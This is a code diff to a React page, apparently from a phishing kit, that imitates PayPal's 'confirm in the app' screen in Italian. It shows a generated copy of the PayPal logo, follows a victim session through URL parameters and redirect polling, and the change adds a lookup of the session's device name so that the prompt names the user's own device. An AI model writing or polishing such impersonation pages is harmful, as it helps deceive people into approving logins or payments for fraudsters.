@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Smartphone, Loader2 } from "lucide-react";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
+import { useQuery } from "@tanstack/react-query";
 import paypalLogo from "@assets/generated_images/PayPal_official_logo_d33d02f7.png";
 
 export default function PayPalApprovePage() {
@@ -12,6 +13,12 @@ export default function PayPalApprovePage() {
     const id = params.get("session");
     if (id) setSessionId(id);
   }, []);
+
+  // Fetch session data to get device name
+  const { data: sessionData } = useQuery<{ device?: string }>({
+    queryKey: ["/api/paypal/session", sessionId],
+    enabled: !!sessionId,
+  });
 
   // Use redirect polling hook
   useRedirectPolling({
@@ -44,7 +51,11 @@ export default function PayPalApprovePage() {
                     Per continuare, vai all'app PayPal
                   </h2>
                   <p className="text-gray-600" data-testid="text-description">
-                    Usa il tuo dispositivo per confermare che sei tu.
+                    {sessionData?.device ? (
+                      <>Usa il tuo <span className="font-medium">{sessionData.device}</span> per confermare che sei tu.</>
+                    ) : (
+                      <>Usa il tuo dispositivo per confermare che sei tu.</>
+                    )}
                   </p>
                 </div>
 
